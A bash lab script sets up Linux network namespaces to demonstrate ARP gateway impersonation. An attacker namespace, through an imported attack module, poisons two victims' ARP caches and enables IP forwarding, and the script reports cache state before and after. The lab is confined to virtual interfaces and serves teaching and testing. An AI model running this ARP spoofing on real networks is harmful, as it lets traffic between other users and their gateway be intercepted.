#!/usr/bin/env bash
# Isolated ARP-based gateway impersonation lab (Linux only, needs root).
#
# Topology, all inside network namespaces, one Linux bridge as the switch:
#
#   victim1 (10.97.0.10) --+
#   victim2 (10.97.0.11) --+-- [switch: br0] --(veth)-- gateway (10.97.0.1)
#                               |
#                               +--(veth)-- attacker (10.97.0.30)
#
#   Phase 1 (baseline): both victims ping the gateway, so their ARP caches hold
#   the gateway's real MAC for 10.97.0.1. The lab then waits a few seconds: Linux
#   ignores unsolicited ARP updates for an entry that was confirmed a moment ago, and
#   without the wait the first victim kept the real MAC in every run.
#   Phase 2 (impersonation): the attacker claims 10.97.0.1 for both victims, and
#   enables IP forwarding while it runs. Each victim's cache entry changes to the
#   attacker's MAC. The attacker's forwarding setting is restored afterwards.
#
# This lab stops at the ARP caches: it shows who each victim sends gateway traffic
# to. It does not route traffic beyond the segment.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/arp_gateway_impersonation_lab.sh
#   sudo REPLY_SECONDS=3 scripts/lab/arp_gateway_impersonation_lab.sh
#
# Requirements: iproute2 (ip, bridge), ping, sysctl, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge ping sysctl; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
REPLY_SECONDS="${REPLY_SECONDS:-3}"
GATEWAY_IP="10.97.0.1"
VICTIM1_IP="10.97.0.10"
VICTIM2_IP="10.97.0.11"
ATTACKER_IP="10.97.0.30"
GATEWAY_MAC="02:00:00:00:00:01"
VICTIM1_MAC="02:00:00:00:00:10"
VICTIM2_MAC="02:00:00:00:00:11"
ATTACKER_MAC="02:00:00:00:00:30"

stop_lab() {
    for ns in victim1 victim2 gateway attacker switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}

trap stop_lab EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add switch
ip netns add victim1
ip netns add victim2
ip netns add gateway
ip netns add attacker

# victim1 <-> switch port sw-v1
ip link add v1-sw type veth peer name sw-v1
ip link set v1-sw netns victim1
ip link set sw-v1 netns switch

# victim2 <-> switch port sw-v2
ip link add v2-sw type veth peer name sw-v2
ip link set v2-sw netns victim2
ip link set sw-v2 netns switch

# gateway <-> switch port sw-g
ip link add g-sw type veth peer name sw-g
ip link set g-sw netns gateway
ip link set sw-g netns switch

# attacker <-> switch port sw-a
ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for port in sw-v1 sw-v2 sw-g sw-a; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

ip netns exec victim1 ip link set v1-sw address "$VICTIM1_MAC"
ip netns exec victim1 ip addr add "$VICTIM1_IP/24" dev v1-sw
ip netns exec victim1 ip link set v1-sw up
ip netns exec victim2 ip link set v2-sw address "$VICTIM2_MAC"
ip netns exec victim2 ip addr add "$VICTIM2_IP/24" dev v2-sw
ip netns exec victim2 ip link set v2-sw up
ip netns exec gateway ip link set g-sw address "$GATEWAY_MAC"
ip netns exec gateway ip addr add "$GATEWAY_IP/24" dev g-sw
ip netns exec gateway ip link set g-sw up
ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip addr add "$ATTACKER_IP/24" dev a-sw
ip netns exec attacker ip link set a-sw up

# MAC a victim has cached for the gateway ("none" if no entry).
cached_gateway_mac() {
    local ns="$1" dev="$2" mac
    mac=$(ip netns exec "$ns" ip neigh show "$GATEWAY_IP" dev "$dev" \
        | grep -oE 'lladdr [0-9a-f:]{17}' | cut -d' ' -f2 || true)
    echo "${mac:-none}"
}

# --- Phase 1: baseline -----------------------------------------------------

echo "Phase 1: both victims contact the gateway, so they learn its real MAC"
ip netns exec victim1 ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null
ip netns exec victim2 ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null
echo "  victim1 cache for $GATEWAY_IP: $(cached_gateway_mac victim1 v1-sw)"
echo "  victim2 cache for $GATEWAY_IP: $(cached_gateway_mac victim2 v2-sw)"
echo "  attacker IP forwarding before: $(ip netns exec attacker sysctl -n net.ipv4.ip_forward)"
echo "  waiting 3 seconds so the entries settle"
sleep 3
echo

# --- Phase 2: impersonation ------------------------------------------------

IMPERSONATE_CODE='
import os, threading, time
from macabre.attacks.arp_gateway_impersonation import GatewayImpersonationConfig, run_gateway_impersonation
stop = threading.Event()
progress = []
result = []
worker = threading.Thread(
    target=lambda: result.append(run_gateway_impersonation(
        GatewayImpersonationConfig(
            iface="a-sw",
            gateway_ip=os.environ["GATEWAY_IP"],
            victims=os.environ["VICTIMS"],
            interval=0.2,
            enable_forwarding=True,
        ),
        stop,
        progress.append,
    )),
)
worker.start()
time.sleep(float(os.environ["REPLY_SECONDS"]))
print("Attacker: forwarding active during the attack:", progress[-1].forwarding_active)
stop.set()
worker.join()
stats = result[0]
print(f"Attacker: {stats.rounds} rounds, {stats.frames} replies sent. {stats.status}")
'

echo "Phase 2: attacker claims $GATEWAY_IP for $VICTIM1_IP and $VICTIM2_IP"
ip netns exec attacker env PYTHONPATH="$ROOT/src" GATEWAY_IP="$GATEWAY_IP" \
    VICTIMS="$VICTIM1_IP $VICTIM2_IP" REPLY_SECONDS="$REPLY_SECONDS" "$PY" -c "$IMPERSONATE_CODE"
echo "  victim1 cache for $GATEWAY_IP: $(cached_gateway_mac victim1 v1-sw)"
echo "  victim2 cache for $GATEWAY_IP: $(cached_gateway_mac victim2 v2-sw)"
echo "  attacker IP forwarding after:  $(ip netns exec attacker sysctl -n net.ipv4.ip_forward)"
echo
echo "Expected: before the attack both caches hold the gateway's MAC ($GATEWAY_MAC). After it,"
echo "both hold the attacker's MAC ($ATTACKER_MAC), and forwarding is restored to its earlier value."
